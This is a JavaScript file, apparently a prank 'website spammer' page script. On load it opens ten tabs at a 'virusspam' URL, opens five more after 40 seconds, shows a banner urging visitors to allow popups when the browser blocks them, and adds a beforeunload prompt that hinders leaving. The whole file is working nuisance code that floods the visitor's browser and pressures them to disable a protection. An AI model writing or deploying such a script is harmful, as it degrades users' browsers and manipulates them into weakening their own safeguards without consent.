function openMultipleTabs(url, times) {
  if (!url || isNaN(times) || times <= 0) {
    console.error("Invalid input: Provide a valid URL and a positive number of times.");
    return;
  }
  // Remove any previous popup warning
  const prevWarning = document.getElementById && document.getElementById("popup-warning");
  if (prevWarning) prevWarning.remove();

  let opened = 0;
  for (let i = 0; i < times; i++) {
    const win = window.open(url);
    if (win) opened++;
  }
  if (opened === 0) {
    showPopupBlockedWarning();
  }
}

function showPopupBlockedWarning() {
  // Try to find a container to show the warning
  let container = document.body;
  // Create warning element
  const warning = document.createElement("div");
  warning.id = "popup-warning";
  warning.innerHTML = `
    <div style="position: fixed; top: 24px; right: 24px; z-index: 9999; display: flex; align-items: center;">
      <span style="color: #d9534f; font-weight: bold; background: #fff3cd; border: 1px solid #ffeeba; padding: 8px 16px; border-radius: 6px; box-shadow: 0 2px 8px #0001; text-align: left;">
        <span style='font-size: 1.5em;'>&#8595;</span> <br>
        Your browser blocked popups!<br>
        Please allow popups for this site to open multiple tabs.
      </span>
    </div>
  `;
  container.appendChild(warning);
}

function setupBeforeUnloadWarning(message = "Stay here :)") {
  window.addEventListener("beforeunload", (e) => {
    e.returnValue = message; // For compatibility with older browsers
    return message; // Modern browsers use this
  });
}

// Open initial tabs and schedule more tabs after a delay
window.onload = () => {
  const initialUrl = "https://website-spammer.raadsel.dev/virusspam/";
  const initialTimes = 10; // Number of times to open initially

  const delayedTimes = 5; // Number of tabs to open after delay
  const delayInMilliseconds = 40000; // 40 seconds

  // Open the initial set of tabs
  openMultipleTabs(initialUrl, initialTimes);

  // Schedule another set of tabs to open after the delay
  setTimeout(() => {
    openMultipleTabs(initialUrl, delayedTimes);
  }, delayInMilliseconds);

  // Setup before-unload warning
  setupBeforeUnloadWarning();
};
